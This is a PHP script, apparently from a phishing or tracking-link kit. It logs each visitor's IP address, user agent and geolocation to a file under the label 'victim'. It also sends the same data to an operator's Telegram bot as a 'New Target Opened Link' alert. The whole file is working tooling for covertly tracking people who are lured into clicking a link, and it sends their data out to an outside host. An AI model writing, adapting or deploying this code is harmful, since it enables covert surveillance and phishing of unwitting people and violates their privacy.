<?php

// Include geolocation helper
if (file_exists('geo.php')) {
    require_once 'geo.php';
}

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

// Get IP geolocation if geo.php is available
$ip_clean = trim($ipaddress);
$geo = null;
if (function_exists('getIPLocation')) {
    $geo = getIPLocation($ip_clean);
    if ($geo && function_exists('saveGeoData')) {
        saveGeoData($ip_clean, $geo);
    }
}

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);

// Add geolocation info to file if available
if ($geo && function_exists('formatGeoLocation') && isset($geo['status']) && $geo['status'] === 'success') {
    fwrite($fp, "\n" . formatGeoLocation($geo) . "\n");
}

fclose($fp);

// Send to Telegram - load from config file
$telegram_token = '';
$telegram_chat = '';
$config_file = 'telegram_config.json';

if (file_exists($config_file)) {
    $config_content = file_get_contents($config_file);
    $config = json_decode($config_content, true);
    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
        $telegram_token = $config['bot_token'];
        $telegram_chat = $config['chat_id'];
    }
}

// Only send if Telegram is configured
if (!empty($telegram_token) && !empty($telegram_chat)) {
    // Escape special characters in message
    $browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
    $message = "🔔 *New Target Opened Link*\n\n";
    $message .= "📍 *IP Address:* " . $ip_clean . "\n";
    $message .= "🌐 *User Agent:* " . $browser_clean . "\n";
    $message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";

    // Add geolocation to Telegram message if available
    if ($geo && function_exists('formatGeoForTelegram') && isset($geo['status']) && $geo['status'] === 'success') {
        $message .= "\n" . formatGeoForTelegram($geo);
    }

    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
    $data = array(
        'chat_id' => $telegram_chat,
        'text' => $message,
        'parse_mode' => 'Markdown'
    );

    $options = array(
        'http' => array(
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
            'timeout' => 10,
            'ignore_errors' => true
        )
    );

    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);

    // Log errors if any
    if ($result === false) {
        $error = error_get_last();
        if ($error !== null) {
            error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
        }
    }
}
